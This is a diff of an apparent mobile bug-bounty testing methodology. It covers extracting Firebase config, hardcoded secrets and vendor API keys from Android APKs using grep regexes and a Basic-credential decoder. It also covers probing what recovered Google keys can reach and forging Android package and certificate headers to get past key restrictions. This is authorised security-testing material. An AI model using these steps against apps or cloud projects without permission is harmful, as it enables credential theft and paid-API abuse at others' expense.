@@ -88,15 +88,18 @@ Block-level n/a note template:
 - **Test:** The Gradle Google Services plugin compiles `google-services.json` into string resources at build time, so the file itself is usually absent from the APK. Recover the project id, API key, database URL, storage bucket, app id and sender id from `res/values/strings.xml` instead.
 - **How:**
 ```bash
-apktool d -f target.apk -o out/
 grep -nE 'google_app_id|google_api_key|firebase_database_url|google_storage_bucket|project_id|gcm_defaultSenderId|default_web_client_id|firebase_url|mobilesdk_app_id' \
-  out/res/values/strings.xml
+  $R/values/strings.xml
 # some builds do still ship the raw file
 unzip -l target.apk | grep -iE 'google-services|firebase|GoogleService'
 unzip -p target.apk res/raw/google-services.json 2>/dev/null | python3 -m json.tool
-find out -name 'google-services.json' -exec python3 -m json.tool {} \;
+# which Firebase SDKs are actually compiled in: the ComponentDiscoveryService registrar list in the merged manifest.
+# firebase_database_url / google_storage_bucket are written by the google-services plugin whether or not the client is present
+grep -oE 'com\.google\.firebase\.components:[A-Za-z0-9_.$]+' "$MF" | sed 's/.*://' | sort -u
+# …database.DatabaseRegistrar = RTDB client; …storage.StorageRegistrar = Storage; …firestore.FirestoreRegistrar; …remoteconfig.RemoteConfigRegistrar; …auth.FirebaseAuthRegistrar; …messaging.FirebaseMessagingRegistrar
+find "$DEC" -name 'google-services.json' -exec python3 -m json.tool {} \;
 ```
-- **Proof:** The six values recorded with `file:line`, then one live request against the project confirming they are current rather than a stale copy.
+- **Proof:** The six values recorded with `file:line`, then one live request against the project confirming they are current rather than a stale copy. For each data-plane identifier state whether a *consumer* exists (registrar present). A store with no consumer is still probed — it is internet-reachable regardless — but the report says the app never reads it: the finding is the project's exposure, not this app's data flow.
 - **Escalation:** Parameterises D18-014 through D18-030 and every Storage/Functions probe. Leaked internal hostnames feed -> D15 API testing.
 - **Ruled out when:** No `com.google.gms.google-services` artefacts exist anywhere in the package — no `google_app_id` string, no `com.google.firebase` classes in the dex, no `firebase` entries in the merged manifest — so the app has no Google/Firebase project to address. Record the three negative greps; "MobSF found no Firebase" is not a ruled-out entry.
 
@@ -108,15 +111,16 @@ find out -name 'google-services.json' -exec python3 -m json.tool {} \;
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the recovered material is a live server credential |
 | **Attacker** | AM-01 |
 | **Applies to** | All |
+| **Requires** | — |
 | **Maps to** | MASWE-0004 (CWE-798), MASTG-TECH-0007 ("it is normally worth taking a look at the rest of the resources and files… sometimes they contain additional goodies like key stores, encrypted databases, certificates") |
 
 - **Test:** Client keys live in `strings.xml`; genuine server-side credentials live in `assets/`, in bundled `.properties` files, in `awsconfiguration.json` / `amplifyconfiguration.json`, and in stray `.pem` / `.p12` / service-account JSON.
 - **How:**
 ```bash
 grep -rniE 'BEGIN (RSA|EC|DSA|OPENSSH|PRIVATE) KEY|-----BEGIN|aws_secret|client_secret|key_secret|private_key' \
-  out/assets/ out/res/ out/unknown/ 2>/dev/null
-grep -rniE 'password|passwd|Basic [A-Za-z0-9+/=]{16,}' out/assets/*.properties 2>/dev/null
-grep -rn '"type": *"service_account"' out/assets out/res 2>/dev/null
+  $A/ $R/ $DEC/apktool/unknown/ 2>/dev/null
+grep -rniE 'password|passwd|Basic [A-Za-z0-9+/=]{16,}' $A/*.properties 2>/dev/null
+grep -rn '"type": *"service_account"' $A $R 2>/dev/null
 find out -iname 'aws*config*' -o -iname 'amplifyconfiguration.json' -o -iname '*.p12' \
      -o -iname '*.jks' -o -iname '*.bks' -o -iname '*.pem' -o -iname '*.plist'
 unzip -l target.apk | grep -iE '\.json$' | grep -iE 'service|account|credential|firebase-adminsdk'
@@ -133,27 +137,27 @@ unzip -l target.apk | grep -iE '\.json$' | grep -iE 'service|account|credential|
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-01 |
 | **Applies to** | Flutter, React Native (Hermes), Unity IL2CPP/Mono, Xamarin/.NET MAUI, Kotlin Multiplatform, and any app with a custom `.so` |
-| **Requires** | native, flutter, react-native, hermes, unity, xamarin, cordova, capacitor, kmp |
+| **Requires** | — |
 | **Maps to** | MASTG-TOOL-0144 (gitleaks), MASTG-TOOL-0125 (Apkleaks), MASTG-TECH-0019 |
 
 - **Test:** MobSF-class scanners parse DEX and resources. For cross-platform apps the backend config is in `libapp.so`, `global-metadata.dat`, `index.android.bundle` or a `.dll`, so the automated scan returns clean on a vulnerable app.
 - **How:**
 ```bash
 # native libraries (all ABIs)
-for so in out/lib/*/*.so; do strings -n 8 "$so" | \
+for so in $L/*/*.so; do strings -n 8 "$so" | \
   grep -aoE 'AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}|[a-z0-9-]+\.firebaseio\.com|[a-z0-9-]+\.supabase\.co|https?://[a-z0-9.-]+\.(amazonaws|googleapis|blob\.core\.windows)\.[a-z.]+'; done | sort -u
 # Flutter
-strings -n 8 out/lib/arm64-v8a/libapp.so > libapp.strings
+strings -n 8 $L/arm64-v8a/libapp.so > libapp.strings
 grep -aoE 'package:[a-z0-9_]+/' libapp.strings | sort -u
 # React Native / Hermes
-strings -n 6 out/assets/index.android.bundle | \
+strings -n 6 $A/index.android.bundle | \
   grep -aEi 'AIza[0-9A-Za-z_-]{35}|api\.|graphql|/v1/|wss://|sentry\.io|bugsnag|appcenter|codepush|firebaseio\.com|amplify|aws'
 # Unity IL2CPP — Il2CppDumper stringliteral.json holds every string literal
-grep -a 'stringliteral' out/stringliteral.json | head
+grep -a 'stringliteral' $DEC/il2cpp/stringliteral.json | head
 # Xamarin/MAUI — unpack assemblies then decompile
-ilspycmd out/assemblies/out/App.dll | grep -nE 'AIza|AKIA|sk_live|apikey|Bearer'
+ilspycmd $DEC/assemblies/out/App.dll | grep -nE 'AIza|AKIA|sk_live|apikey|Bearer'
 # Cordova/Ionic/Capacitor web assets
-grep -rniE 'api[_-]?key|secret|token|password|firebase|amazonaws|sentry' out/assets/www out/assets/public 2>/dev/null
+grep -rniE 'api[_-]?key|secret|token|password|firebase|amazonaws|sentry' $A/www $A/public 2>/dev/null
 ```
 - **Proof:** A validated key present **only** in the native blob or bundle, with the extraction command and the offset/file recorded so the client can find it in their build.
 - **Escalation:** Feeds the restriction gate (D18-009) and every vendor probe; also a -> D19 cross-platform finding if the framework layer is the only place the config exists.
@@ -167,21 +171,23 @@ grep -rniE 'api[_-]?key|secret|token|password|firebase|amazonaws|sentry' out/ass
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for a live infra credential; `…intentionally_public_sample_or_invalid` (P5) otherwise |
 | **Attacker** | AM-01 |
 | **Applies to** | All |
+| **Requires** | — |
 | **Maps to** | MASWE-0004 (CWE-798), MASTG-TOOL-0144, MASTG-TOOL-0125 |
 
 - **Test:** Word-grep produces noise; vendor prefixes do not. The corpus's explicit anti-pattern is "don't grep only for `password`". Sweep the prefix set across the whole decompiled tree, then count what you got.
 - **How:**
 ```bash
-S=out/sources; R=out/res; A=out/assets
+S=$DEC/jadx/sources; R=$DEC/apktool/res; A=$DEC/apktool/assets   # the P2 tree (START.md §6); D18-005 sets L and MF too
 grep -rhoE 'AKIA[A-Z0-9]{16}'                              $S $R $A   # AWS access key id
 grep -rhoE 'ASIA[A-Z0-9]{16}'                              $S $R $A   # AWS temporary
 grep -rhoE 'aws_secret_access_key["[:space:]:=]+[A-Za-z0-9/+=]{40}' $S $R $A
 grep -rhoE 'AIza[A-Za-z0-9_-]{35}'                         $S $R $A   # Google API key
-grep -rhoE 'ya29\.[A-Za-z0-9_-]+'                          $S $R $A   # Google OAuth refresh token
-grep -rhoE 'gh[ps]_[A-Za-z0-9]{36}'                        $S $R $A   # GitHub PAT
+grep -rhoE 'ya29\.[A-Za-z0-9_-]+'                          $S $R $A   # Google OAuth ACCESS token (short-lived; proves a token was embedded or logged)
+grep -rhoE '1//0[A-Za-z0-9_-]{40,}'                        $S $R $A   # Google OAuth REFRESH token (persistent)
+grep -rhoE 'github_pat_[A-Za-z0-9_]{80,}|gh[pousr]_[A-Za-z0-9]{36}' $S $R $A   # GitHub PATs incl. fine-grained
 grep -rhoE 'glpat-[A-Za-z0-9_-]{20}'                       $S $R $A   # GitLab PAT
 grep -rhoE 'xox[pbar]-[A-Za-z0-9-]+'                       $S $R $A   # Slack
-grep -rhoE 'sk-[A-Za-z0-9]{48}'                            $S $R $A   # OpenAI
+grep -rhoE 'sk-(proj|svcacct|admin)-[A-Za-z0-9_-]{40,}|sk-[A-Za-z0-9]{48}' $S $R $A   # OpenAI, 2024+ and legacy formats
 grep -rhoE 'sk-ant-[A-Za-z0-9_-]{90,}'                     $S $R $A   # Anthropic
 grep -rhoE 'AC[a-f0-9]{32}'                                $S $R $A   # Twilio account SID
 grep -rhoE 'sk_live_[A-Za-z0-9]{24}'                       $S $R $A   # Stripe live secret
@@ -191,13 +197,28 @@ grep -rhoE 'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}'      $S $R $A   # SendGrid
 grep -rhoE 'cloudinary://[0-9]+:[A-Za-z0-9_-]+@[a-z0-9-]+' $S $R $A   # Cloudinary
 grep -rhoE 'client_secret["[:space:]:=]+[A-Za-z0-9_-]{24,}' $S $R $A
 grep -rhoE 'https?://(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|127\.)[0-9.]+(:[0-9]+)?[a-zA-Z0-9./_?=&-]*' $S $R $A
-# tool cross-check, then reconcile the two lists
-apkleaks -f target.apk -o apkleaks.txt
-gitleaks detect --no-git --source ./out/ --report-path gitleaks.json
+# HTTP Basic literals anywhere in sources/res/assets, decoded; a user:password with a 20+ char password is a credential, not a sample
+grep -rhoE 'Basic [A-Za-z0-9+/=]{12,}' $S $R $A | sort -u > basic_literals.txt; wc -l basic_literals.txt
+python3 - <<'PY'
+import base64
+for l in open('basic_literals.txt'):
+    tok = l.split()[1]
+    try: print(tok[:12], '->', base64.b64decode(tok + '=' * (-len(tok) % 4)).decode('utf-8', 'replace')[:80])
+    except Exception as e: print(tok[:12], 'ERR', e)
+PY
+grep -rnE 'Credentials\.basic\(|"Authorization", *"Basic |Proxy-Authorization' $S | head        # the consumer: which host receives it
+# tool cross-check — each tool must pass a positive control on THIS tree before its empty result counts
+printf '<string name="pc">AIzaSyA-positive-control-0123456789abcdefg</string>\n' > "$R/values/zz_positive_control.xml"
+trufflehog filesystem "$DEC" --no-verification --json > trufflehog.json   # --no-verification: the tool must never call the vendor with a live key — D18-009 does that under your control
+grep -c 'positive-control' trufflehog.json                                 # must be >=1 or the tool is blind on this tree
+gitleaks dir "$DEC/apktool" --report-path gitleaks.json                    # ONE path per invocation: several paths silently scan 0 bytes
+grep -c 'positive-control' gitleaks.json                                   # gitleaks <=8.30 misses AIza keys inside XML (>AIza…<): expect 0 and record that it failed its control
+rm "$R/values/zz_positive_control.xml"
+apkleaks -f target.apk -o apkleaks.json --json                             # runs its own jadx pass (15–20 min on a 200 MB base): run ONCE, reuse in D18-046
 ```
-- **Proof:** A deduplicated candidate table with `file:line` for each hit, **and a count**: number of candidates found, number validated live, number restricted. Anything you did not validate is explicitly marked unvalidated.
+- **Proof:** A deduplicated candidate table with `file:line` for each hit, **and a count**: number of candidates found, number validated live, number restricted. Anything you did not validate is explicitly marked unvalidated. Pre-filter apkleaks' known-noise buckets before counting (`JSON_Web_Token` = public-suffix/TLD lists, `Facebook_Secret_Key` = any 32-hex string, `Google_API_Key` = D18-001's resource keys already in the table). A key already probed in D18-009 is cited from that row, never re-probed — every probe is a request logged on the vendor's project. Each decoded Basic credential gets a row in the identity table with its consumer host; validate per D18-013 with ONE benign request to that host only.
 - **Escalation:** Every candidate enters the restriction gate (D18-009) and, if live, the scope enumeration for its vendor.
-- **Ruled out when:** Zero prefix matches across DEX, resources, assets and every `.so`/bundle (D18-003 run first), and both `apkleaks` and `gitleaks` return empty on the same tree. Two independent tools agreeing on empty is the defensible negative; one tool is not.
+- **Ruled out when:** Zero prefix matches across DEX, resources, assets and every `.so`/bundle (D18-003 run first), the Basic-literal pass is empty, and two independent tools that each PASSED a positive control on this tree return empty. A tool that failed its control does not count toward the two; the prefix sweep is primary, tools are the cross-check. Cross-reference: D26-024 holds the tool recipe and D01-064 the every-split rule — cite them rather than re-running.
 
 ### D18-005 · Build the backend-identity table before issuing any probe
 
@@ -207,13 +228,19 @@ gitleaks detect --no-git --source ./out/ --report-path gitleaks.json
 | **VRT** | n/a — methodology artefact |
 | **Attacker** | n/a |
 | **Applies to** | All |
+| **Requires** | — |
 | **Maps to** | MASTG-TECH-0007, MASTG-TECH-0019 |
 
 - **Test:** Every item below is parameterised by a small set of identifiers. Collect them once, in one file, with provenance, so that a probe result can always be traced back to where the identifier came from — and so the ruled-out register has something to point at.
-- **How:** Produce `backend-identity.md` with one row per identifier: `value | kind | source file:line | vendor | restriction verdict | probe result | date`. Kinds to fill: `project_id`, `google_api_key`, `google_app_id`, `gcm_defaultSenderId`, `firebase_database_url`, `storage_bucket`, `cognito_identity_pool`, `cognito_user_pool`, `supabase_ref` + `anon_key`, `appsync_endpoint` + `api_key`, every `*.s3*.amazonaws.com` / `storage.googleapis.com/*` / `*.blob.core.windows.net` host, every `*.cloudfunctions.net` / `*-lambda-url.*` / `*.execute-api.*` / `*.run.app` host, and every vendor key with its vendor name.
+- **How:** Set the decompiled-tree variables once per shell — every How in this chapter uses them, and `$DEC` is the
+  P2 decompilation per START.md §6 (never re-run apktool/jadx here):
 ```bash
-grep -rhoE '[a-z0-9.-]+\.(s3[.-][a-z0-9-]*\.amazonaws|blob\.core\.windows|storage\.googleapis|firebaseio|firebasedatabase\.app|appspot|supabase|cloudfunctions|run\.app)\.[a-z.]*' out/ | sort -u > hosts.txt
-grep -rhoE 'us-[a-z]+-[0-9]:[0-9a-f-]{36}' out/ | sort -u >> hosts.txt   # Cognito identity pool ids
+S=$DEC/jadx/sources; R=$DEC/apktool/res; A=$DEC/apktool/assets; L=$DEC/apktool/lib; MF=$DEC/apktool/AndroidManifest.xml
+```
+  Produce `backend-identity.md` with one row per identifier: `value | kind | source file:line | vendor | restriction verdict | probe result | date`. Kinds to fill: `project_id`, `google_api_key`, `google_app_id`, `gcm_defaultSenderId`, `firebase_database_url`, `storage_bucket`, `cognito_identity_pool`, `cognito_user_pool`, `supabase_ref` + `anon_key`, `appsync_endpoint` + `api_key`, every `*.s3*.amazonaws.com` / `storage.googleapis.com/*` / `*.blob.core.windows.net` host, every `*.cloudfunctions.net` / `*-lambda-url.*` / `*.execute-api.*` / `*.run.app` host, and every vendor key with its vendor name.
+```bash
+grep -rhoE '[a-z0-9.-]+\.(s3[.-][a-z0-9-]*\.amazonaws|blob\.core\.windows|storage\.googleapis|firebaseio|firebasedatabase\.app|appspot|supabase|cloudfunctions|run\.app)\.[a-z.]*' "$DEC" | sort -u > hosts.txt
+grep -rhoE 'us-[a-z]+-[0-9]:[0-9a-f-]{36}' "$DEC" | sort -u >> hosts.txt   # Cognito identity pool ids
 wc -l hosts.txt
 ```
 - **Proof:** The populated table. Every later item's "ruled out when" cites a row of it.
@@ -225,21 +252,22 @@ wc -l hosts.txt
 | | |
 |---|---|
 | **Severity ceiling** | Low |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) once a specific component is shown reachable; the inventory alone is P5 |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) once a specific component is shown reachable; the inventory alone is P5 |
 | **Attacker** | AM-03 for the components it reveals |
 | **Applies to** | All |
+| **Requires** | — |
 | **Maps to** | MASWE-0044, MASTG-KNOW-0026; `developer.android.com/privacy-and-security/risks/insecure-library` |
 
 - **Test:** In a stripped, R8-renamed APK the merged manifest is the only reliable SDK list: providers, services, receivers and permissions injected by AARs name their vendors even when every class has been renamed. Each third-party component is an exported surface the first-party team has never reviewed.
 - **How:**
 ```bash
-apktool d -f target.apk -o out && xmllint --format out/AndroidManifest.xml > merged.xml
+xmllint --format "$MF" > merged.xml
 grep -oE 'android:name="[a-z]+\.[a-zA-Z0-9_.]+"' merged.xml | cut -d'"' -f2 \
   | awk -F. '{print $1"."$2"."$3}' | sort | uniq -c | sort -rn | head -40
 # every non-first-party component and its export state, with the declaring package
 python3 - <<'PY'
 import xml.dom.minidom as m
-d = m.parse('out/AndroidManifest.xml')
+d = m.parse('$MF')
 pkg = d.documentElement.getAttribute('package')
 for tag in ('activity','activity-alias','service','receiver','provider'):
     for c in d.getElementsByTagName(tag):
@@ -263,6 +291,7 @@ grep -nE 'ADDED from|MERGED from' app/build/outputs/logs/manifest-merger-release
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the old key is still live |
 | **Attacker** | AM-01 |
 | **Applies to** | All apps with public release history (Play, APK mirrors, the vendor's own download page) |
+| **Requires** | — |
 | **Maps to** | Google ASI campaign "Exposed Firebase Cloud Messaging Server Keys" (started 2021-10-12) |
 
 - **Test:** Google's own remediation guidance for exposed FCM keys states that removing the key from the app does not fix it, because "an attacker can simply find the key in an older version". The same is true of every credential class here. A clean current build does not mean a clean project.
@@ -290,6 +319,7 @@ diff <(grep -rhoE 'AIza[0-9A-Za-z_-]{35}' decomp/current/ | sort -u) \
 | **VRT** | `using_components_with_known_vulnerabilities.outdated_software_version` (P5) on its own — the finding is always the reachable defect |
 | **Attacker** | n/a |
 | **Applies to** | R8/ProGuard-obfuscated release builds, i.e. most of them |
+| **Requires** | — |
 | **Maps to** | MASWE-0044, MASTG-TOOL-0134 (cdxgen), MASTG-TOOL-0131 (dependency-check) |
 
 - **Test:** With classes renamed, grepping for `com.vendor.Sdk` fails. R8 does not rename string constants, resource identifiers or JNI export symbols — anchor on those, then hook the obfuscated name you found.
@@ -299,15 +329,15 @@ diff <(grep -rhoE 'AIza[0-9A-Za-z_-]{35}' decomp/current/ | sort -u) \
 unzip -l target.apk | grep -iE 'META-INF/.*\.version|\.properties$'
 unzip -p target.apk META-INF/com.google.android.play_play-core.version 2>/dev/null
 # anchor 2: string constants the SDK sends or logs
-grep -rn '"n_intent_uri"\|"restoreId"\|"af_dp"\|"~referring_link"\|"user_hash"' out/sources/
+grep -rn '"n_intent_uri"\|"restoreId"\|"af_dp"\|"~referring_link"\|"user_hash"' $S/
 # anchor 3: resource ids and prefixes (never renamed)
-grep -rn 'R.string\.\|R.layout\.' out/sources/ | grep -iE 'zendesk|intercom|braze|clevertap|engage|crop'
-grep -rn 'zui_\|intercom_\|com_appboy\|ct_\|branch_' out/res/values/*.xml | head
+grep -rn 'R.string\.\|R.layout\.' $S/ | grep -iE 'zendesk|intercom|braze|clevertap|engage|crop'
+grep -rn 'zui_\|intercom_\|com_appboy\|ct_\|branch_' $R/values/*.xml | head
 # anchor 4: JNI exports
-nm -D --defined-only out/lib/arm64-v8a/*.so | grep ' T Java_'
+nm -D --defined-only $L/arm64-v8a/*.so | grep ' T Java_'
 # SBOM if the build ships one
 cdxgen -t android -o sbom.json target.apk
-dependency-check --scan out/ --format JSON
+dependency-check --scan "$DEC" --format JSON
 ```
 - **Proof:** An obfuscated class tied to a named SDK and version by at least two independent anchors, then a Frida hook on the obfuscated name showing the SDK's expected behaviour.
 - **Escalation:** Feeds -> D17 supply chain and D18-067; a named version with a vendor advisory converts an SDK finding into one with a concrete remediation, which materially raises the payout odds.
@@ -321,24 +351,26 @@ dependency-check --scan out/ --format JSON
 | **VRT** | decides between `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) and `…intentionally_public_sample_or_invalid` (P5) |
 | **Attacker** | AM-01 |
 | **Applies to** | Every `AIza…` key recovered from the package |
+| **Requires** | — |
 | **Maps to** | Google Cloud API key documentation (Android application restriction, API restrictions); `developers.google.com/maps/api-security-best-practices` |
 
 - **Test:** Never report "hardcoded API key". Report what the key does from a host that is not the app. There are three distinct responses and they mean three different things — collapsing them is the most common way a D18 report dies.
 - **How:**
 ```bash
 K=AIzaSy...
-# (a) Identity Toolkit probe — tells you whether the key is app-restricted at all
-curl -s "https://identitytoolkit.googleapis.com/v1/projects?key=$K" | jq -r '.error.message // "NO ERROR"'
-# (b) a billable web-service probe
-curl -s "https://maps.googleapis.com/maps/api/geocode/json?address=London&key=$K" | jq -r '.status, .error_message'
-# (c) the data plane, independent of the key
-curl -s "https://<project>-default-rtdb.firebaseio.com/.json?shallow=true" -w '\nHTTP %{http_code}\n'
+[ "${#K}" -eq 39 ] || echo "WARN: key is ${#K} chars, not 39 — re-extract from file:line; a truncated key returns API_KEY_INVALID and reads as dead"
+probe(){ curl -s "$1" | jq -r '[.error.status, (.error.details[]?.reason // empty), .error.message // .status] | map(select(.!=null)) | join(" | ")'; }
+probe "https://identitytoolkit.googleapis.com/v1/projects?key=$K"                        # (a) app-restriction oracle
+probe "https://maps.googleapis.com/maps/api/geocode/json?address=London&key=$K"          # (b) billable web service
+curl -s "https://<project>-default-rtdb.firebaseio.com/.json?shallow=true" -w '\nHTTP %{http_code}\n'   # (c) data plane, key-independent
 ```
-  Read the result as follows:
-  * `"Requests from this Android client are blocked"` (or Maps `REQUEST_DENIED` with the same text) = **application-restricted**. Safe. Record it as a ruled-out entry and move on.
-  * `ADMIN_ONLY_OPERATION` = the key was **accepted**; only that specific operation is admin-disabled. This is *not* an application restriction. It is usually still informational for a Firebase key (public by design) but it means you must keep testing other endpoints with this key.
+  Read the `reason` codes, not the message text (the text varies, the reason does not):
+  * `API_KEY_ANDROID_APP_BLOCKED` ("Requests from this Android client application … are blocked", or Maps `REQUEST_DENIED` with the same text) = **application-restricted**. Ruled-out row; then run D18-011 once.
+  * `API_KEY_SERVICE_BLOCKED` = **API-restricted**: this API is not on the key's allow-list. It says NOTHING about application restriction — record app restriction as *not reached*, not *absent*; grep the dex for the `googleapis.com` hosts the app itself calls, re-run (a) against one of those APIs, with and without the forged headers of D18-011.
+  * `API_KEY_IP_ADDRESS_BLOCKED` / `API_KEY_HTTP_REFERRER_BLOCKED` = IP / referrer restriction (a web key shipped in the app) — ruled-out row.
+  * `ADMIN_ONLY_OPERATION` = the key was **accepted**; only that operation is admin-disabled. Not an application restriction — keep testing other endpoints with this key.
   * `"status": "OK"` with real data, or any 200 carrying a result = **unrestricted from an arbitrary host**. Now determine what it reaches (D18-012) before rating it.
-  * `API key not valid` / `INVALID_KEY_TYPE` / 401 = dead key. Not a finding.
+  * `API_KEY_INVALID` / `INVALID_KEY_TYPE` = dead **only if the key is 39 characters and copied verbatim from `file:line`**. Otherwise re-extract — a truncated live, restricted key has been recorded as dead in practice.
 - **Proof:** The verbatim vendor error string or success body for each key, pasted into the report — in the negative case as a ruled-out entry, in the positive case as the restriction evidence.
 - **Escalation:** Unrestricted -> D18-010 (billing), D18-012 (service surface), D18-028 (enumeration oracle). Restricted -> graveyard row.
 - **Ruled out when:** Every recovered key returns the application-restriction string, an invalid-key error, or a 401. That is a *defensible* negative with the exact response recorded. "I did not test it because Firebase keys are public" is not — the key being public by design is precisely why you must test what it reaches.
@@ -351,13 +383,14 @@ curl -s "https://<project>-default-rtdb.firebaseio.com/.json?shallow=true" -w '\
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pay_per_use_abuse` (P4); rate up on demonstrated multi-API scope and quantified cost |
 | **Attacker** | AM-01 |
 | **Applies to** | Any app embedding Google Maps/Places; the same two-axis question applies to Mapbox, HERE and Algolia search keys |
+| **Requires** | — |
 | **Maps to** | `developers.google.com/maps/api-security-best-practices` — Android application restriction = package name + SHA-1 signing certificate fingerprint; separate API restrictions; "You are financially responsible for charges caused by abuse of unrestricted API keys."; Secrets Gradle Plugin |
 
 - **Test:** The Maps key is in `AndroidManifest.xml` or `strings.xml` by construction, so extractability is never the finding. There are two independent controls — *application* restriction (package + SHA-1) and *API* restriction (which services the key may call) — and teams commonly set neither, or only the first.
 - **How:**
 ```bash
 grep -rnE 'com\.google\.android\.geo\.API_KEY|com\.google\.android\.maps\.v2\.API_KEY|MAPS_API_KEY|PLACES_API_KEY' \
-  out/AndroidManifest.xml out/res/values/*.xml
+  $MF $R/values/*.xml
 K=AIzaSy...
 for u in \
  "https://maps.googleapis.com/maps/api/geocode/json?address=London&key=$K" \
@@ -380,13 +413,16 @@ done
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pay_per_use_abuse` (P4) |
 | **Attacker** | AM-01 |
 | **Applies to** | Any Google API key with an Android application restriction |
+| **Requires** | — |
 | **Maps to** | Google Cloud API key documentation — the Android restriction is enforced from the `X-Android-Package` and `X-Android-Cert` request headers |
 
 - **Test:** The Android application restriction is enforced by two headers the client sends. Both are attacker-supplied and both are recoverable from the APK, so the restriction stops casual abuse but is not an authentication boundary. Demonstrate it once, explicitly, so the report's remediation advice is right (rotate + scope, not "add a package restriction").
 - **How:**
 ```bash
-PKG=$(grep -oE 'package="[^"]+"' out/AndroidManifest.xml | head -1 | cut -d'"' -f2)
-CERT=$(keytool -printcert -jarfile target.apk | awk '/SHA1:/{print $2}' | head -1 | tr -d ':')
+PKG=$(grep -oE 'package="[^"]+"' $MF | head -1 | cut -d'"' -f2)
+# keytool -printcert -jarfile reads only the v1 (JAR) signature and prints "Not a signed jar file" on v2/v3-only APKs (the norm at minSdk >= 24): read the signer from the APK Signature Scheme block
+CERT=$(apksigner verify --print-certs target.apk | awk -F': ' '/SHA-1 digest/{print $2; exit}' | tr -d ': ' | tr a-f A-F)
+[ -n "$CERT" ] || echo 'no signer fingerprint — stop: an empty X-Android-Cert makes the "restriction holds" result an artefact'
 K=AIzaSy...
 # without the headers
 curl -s "https://maps.googleapis.com/maps/api/geocode/json?address=London&key=$K" | jq -r '.status'
@@ -406,22 +442,24 @@ curl -s "https://maps.googleapis.com/maps/api/geocode/json?address=London&key=$K
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the key reaches an API that returns or mutates data |
 | **Attacker** | AM-01 |
 | **Applies to** | Every unrestricted `AIza…` key |
+| **Requires** | — |
 | **Maps to** | Google Cloud API key documentation — an unrestricted key "can be used with all APIs that accept API keys… and can be used from anywhere"; API8:2023 |
 
 - **Test:** "It's just the Maps key" is an assumption. Without an API restriction the key reaches every API in the project that accepts API keys. Enumerate the reach before rating; the corpus's own anti-pattern warning is that over-claiming an analytics key costs credibility, and under-claiming an Identity Toolkit key loses a P1.
 - **How:**
 ```bash
-K=AIzaSy...
-P=<project_id>
-probe(){ printf '%-58s %s\n' "$1" "$(curl -s -o /tmp/r -w '%{http_code}' "$@" >/dev/null; head -c 200 /tmp/r)"; }
-curl -s "https://identitytoolkit.googleapis.com/v1/projects?key=$K"                       | head -c 200; echo
-curl -s "https://firebaseremoteconfig.googleapis.com/v1/projects/$P/namespaces/firebase:fetch?key=$K" \
-     -H 'Content-Type: application/json' -d '{"app_instance_id":"probe","app_id":"<google_app_id>"}' | head -c 300; echo
-curl -s "https://firestore.googleapis.com/v1/projects/$P/databases/(default)/documents?key=$K" | head -c 300; echo
-curl -s "https://www.googleapis.com/customsearch/v1?key=$K&q=x"      | jq -r '.error.message // "OK"'
-curl -s "https://translation.googleapis.com/language/translate/v2?key=$K&q=hi&target=fr" | jq -r '.error.message // "OK"'
-curl -s "https://safebrowsing.googleapis.com/v4/threatLists?key=$K"  | jq -r '.error.message // "OK"'
-curl -s "https://fcm.googleapis.com/v1/projects/$P/messages:send?key=$K" -X POST -d '{}' | jq -r '.error.message // "?"'
+K=AIzaSy...; P=<project_id>
+probe(){ printf '%-62s %s %s\n' "${1%%\?*}" "$(curl -s -o /tmp/r -w '%{http_code}' "$@")" "$(head -c 160 /tmp/r | tr '\n' ' ')"; }
+probe "https://identitytoolkit.googleapis.com/v1/projects?key=$K"
+probe "https://firestore.googleapis.com/v1/projects/$P/databases/(default)/documents:listCollectionIds?key=$K" -X POST -H 'Content-Type: application/json' -d '{}'
+probe "https://firebaseremoteconfig.googleapis.com/v1/projects/$P/namespaces/firebase:fetch?key=$K" -X POST -H 'Content-Type: application/json' -d '{"app_instance_id":"probe","app_id":"<google_app_id>"}'
+probe "https://generativelanguage.googleapis.com/v1beta/models?key=$K"            # Gemini API — billable per token; the common 2026 leak
+probe "https://www.googleapis.com/customsearch/v1?key=$K&q=x"
+probe "https://translation.googleapis.com/language/translate/v2?key=$K&q=hi&target=fr"
+probe "https://safebrowsing.googleapis.com/v4/threatLists?key=$K"
+probe "https://youtube.googleapis.com/youtube/v3/search?part=id&q=x&key=$K"
+probe "https://places.googleapis.com/v1/places:searchText?key=$K" -X POST -H 'Content-Type: application/json' -d '{"textQuery":"cafe"}'   # new Places API: 400 (bad field mask) = allowed, 403 = blocked
+# FCM v1 takes no ?key= — a 401 there is not a restriction result; the send credential is D18-032
 ```
 - **Proof:** A table of API → HTTP status → first 200 bytes of body. The clearest single piece of evidence is a 200 with data from an API the app demonstrably never calls (it is not in the dex and not in the proxy capture).
 - **Escalation:** A reachable Identity Toolkit -> D18-028 enumeration and D18-020 self-enrolment; a reachable Remote Config -> D18-023; a reachable Firestore -> D18-017. Billable-only reach stays at D18-010's rating.
@@ -435,6 +473,7 @@ curl -s "https://fcm.googleapis.com/v1/projects/$P/messages:send?key=$K" -X POST
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.intentionally_public_sample_or_invalid` (P5) vs `…for_publicly_accessible_asset` (P1) vs `…for_internal_asset` (P3) |
 | **Attacker** | n/a |
 | **Applies to** | Every credential recovered anywhere in this chapter |
+| **Requires** | — |
 | **Maps to** | Bugcrowd VRT nodes above; Basecamp's carve-out ("hardcoded keys are out unless chained with a demonstrated cross-user impact that does not require physical device access"); Xiaomi's General Assessment Rules ("whether the data or link should have access restricted" and "the sensitivity of the data or link exposed to the public") |
 
